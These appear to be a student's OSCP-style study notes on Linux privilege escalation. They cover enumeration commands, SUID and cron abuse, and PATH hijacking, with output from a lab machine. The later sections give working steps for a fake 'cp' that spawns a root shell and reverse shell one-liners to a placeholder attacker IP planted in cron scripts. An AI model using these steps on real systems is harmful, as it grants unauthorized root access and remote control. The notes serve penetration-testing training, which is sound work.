## Privilege Escalation Methodology

#### 1. User Recon

Understanding who you are in a system and what privileges you have
Knowing this can help us identify what actions we just take next
Are you a low level user? What groups are you in?

```php
whoami 
> root
```

```php
id
>uid=0(root) gid=0(root)
```

Were looking if they are in the sudo group, might have passwordless root 

#### 2. System Info

Gathering OS and kernel version info, useful for kernel exploits and version specific vulnerabilities.

```php
uname -a
>Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

```php
cat /etc/*release
>DISTRIB_ID=Ubuntu
>DISTRIB_RELEASE=8.04
>DISTRIB_CODENAME=hardy
>DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

Were looking for kernel version, OS name and version, and verifying if the system is `32-bit` or `64-bit` based

#### 3. Sudo Permission Check

Checking what we can run with sudo and see if it requires a password or not
Misconfigured sudo rules allow you to escalate directly to root

```php
sudo -l
>User root may run the following commands on this host:
>    (ALL) ALL
```

Were looking for stuff such as:
- `(ALL : ALL) NOPASSWD: ALL` = direct root
- `sudoedit` access = can often edit system files as root

#### 4. SUID Binary Hunt

SUID binaries run with the privilege of the file owner, often root
Exploiting misconfigured SUID binaries lets you run commands as root
A common vector for escalation if writable or vulnerable

```php
find / -perm -u=s -type f 2>/dev/null
>/usr/bin/passwd
>/usr/bin/mtr
>/usr/sbin/uuidd
...
```

Were looking for custom or unusual binaries in `/home`, `/opt`, `/tmp`

#### 5. Process + Cron Jobs

Identify any automated tasks we could exploit being run by root
We can exploit cron jobs by replacing writable scripts with our payloads

```php
ps aux
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

Were looking for scripts called as root `/root/backup.sh`
Writable scripts or paths in `/etc/cron.*`
Repeating tasks in `ps aux` that interact with user controlled files

#### 6. Environment Abuse & PATH Hijacking

Checking for unsafe environment settings that could lead to PATH hijacking or more
If root runs a command like backup and its found in your writable path than our version is the one that gets ran

```php
env
>TERM=linux
>QUIET=no
>PATH=/sbin:/bin:/usr/sbin:/usr/bin
>RUNLEVEL=2
>runlevel=2
>UPSTART_EVENT=runlevel
```

```php
echo $PATH
>/sbin:/bin:/usr/sbin:/usr/bin
```

```php
ls -la /tmp
>total 28
>drwxrwxrwt  5 root     root    4096 Jun  9 16:51 .
>drwxr-xr-x 21 root     root    4096 Oct 31  2020 ..
>drwxrwxrwt  2 root     root    4096 Jun  9 16:46 .ICE-unix
>-r--r--r--  1 root     root      11 Jun  9 16:46 .X0-lock
>drwxrwxrwt  2 root     root    4096 Jun  9 16:46 .X11-unix
>-rw-------  1 tomcat55 nogroup    0 Jun  9 16:47 5681.jsvc_up
>prw-rw-rw-  1 root     root       0 Jun  9 18:18 enmfw
>-rw-r--r--  1 root     root    1600 Jun  9 16:46 vgauthsvclog.txt.0
>drwx------  2 root     root    4096 Jun  9 16:49 vmware-root
```

Were looking if `/tmp` or `.` is early in the PATH
If we can write to any directory that is early in the PATH
Any suspicious environment variables 

#### 7. Linux Capabilities

List binaries with Linux capabilities, may allow them to do things normally reserved for root
Capabilities such as `cap_setuid` and `cap_net_bind_service` for escalation

```php
getcap -r / 2>/dev/null
```

Were looking for any binaries we can execute or write to
Special powers assigned to binaries 

--- 

## OSCP Privilege Escalation Methodology

https://www.youtube.com/watch?v=VpNaPAh93vE

---

## SUID + PATH Hijacking Practice

SUID stands for set user ID, its a special file permission on Linux that lets users execute a file with the privileges of the file owner (typically root) 

```php
-rwsr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/passwd
```

Were looking for this `s` bit to be turned on
In this case `passwd` is owned by root and any user is able to run it with root privileges

The goal of SUID exploitation is, find an SUID root binary that:
- you can control directly or indirectly
- calls other programs without using absolute paths
- can be abused using PATH hijacking

PATH hijacking abuses how Linux programs find executables, if an SUID binary runs something like `ls` or another command without a full path like `/bin/ls`, it looks in the directories listed in the PATH variable

If we can control the PATH, we can create a fake binary of `ls`, put it in a directory that we control, and change the PATH variable so that our version gets executed as root

Step 1: find a SUID binary

```php
find / -perm -4000 2>/dev/null
```

Look for custom binaries not just standard ones such as `passwd` and `sudo`

Step 2: analyze the binary
Does it call other programs like:

```php
system("cp /tmp/file /root/file");
```

if it doesn't use full paths then it is vulnerable

Step 3: build your payload

In this instance we are creating a malicious version `cp`

```bash
echo '#!/bin/bash' > cp
echo '/bin/bash' >> cp
chmod +x cp
```

And we place it in a directory

```bash
mkdir /tmp/fakebin
mv cp /tmp/fakebin
```

Step 4: Hijack the PATH

```php
export PATH=/tmp/fakebin:$PATH
```

Step 5: Run the SUID binary
Now when we try to run `cp` it executes our fake `cp` and gives us a root shell

SUID + PATH hijacking is about control
If a root owned binary trusts your environment you can turn that trust into root access

## PSPY + Cron Jobs

`pspy` is a process monitoring tool that lets you see commands being executed in real time without needing root privileges. Its like having CCTV on the systems internals

A cron job is a scheduled task in Linux, it runs automatically at specified times
Root and other users can schedule tasks using:
- `/etc/crontab`
- `/etc/cron.*`
- `crontab -e`

Cron jobs are valuable because they might be running as root, they could call scripts or binaries regularly, and use files or commands that we can modify.

If a cron job is calling a file or a script that is writable or it relies on a program we can hijack we can inject our own payload and wait for the cron job to execute it as root.

Use `pspy` to spy on whats running on the system
Find a cron job being run by root that calls something
The cron job could be edited, replaced, or leveraged 
Then we inject a reverse shell or bash command into it

Step 1: Run `pspy`
We might see some output like:

```php
2025/06/11 12:00:01 CMD: UID=0    root    /bin/sh -c /opt/backup.sh
```

The file `backupscript.sh` is being ran every minute

Step 2: investigate the script

```php
ls -l /opt/backup.sh
```

Were checking if the file is writable, if the directory is writable, and what programs the file might be calling when its executed

If it calls something like:

```php
#!/bin/bash
tar czf /root/backup.tar.gz /var/www/html
```

We could try replacing `tar` with PATH hijacking

Step 3: exploit it 

Edit the script directly if possible, wait for the cron to execute it and gain a shell

```php
echo "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" > /opt/backup.sh
```

If a script does something like this we can hijack the PATH

```php
#!/bin/bash
cp /home/user/file.txt /tmp/
```

If it doesn't use full paths then we can create a fake binary for it to execute, update its PATH, and run the fake binary

```php
echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' > cp
chmod +x cp
mkdir /tmp/fakebin
mv cp /tmp/fakebin
export PATH=/tmp/fakebin:$PATH
```

`pspy` is our privilege escalation radar, it exposes hidden scheduled activity
cron is the automatic root agent waiting to be hijacked

if `pspy` shows us a file being called every minute by UID 0 and we can control any part of that process then we win 

---
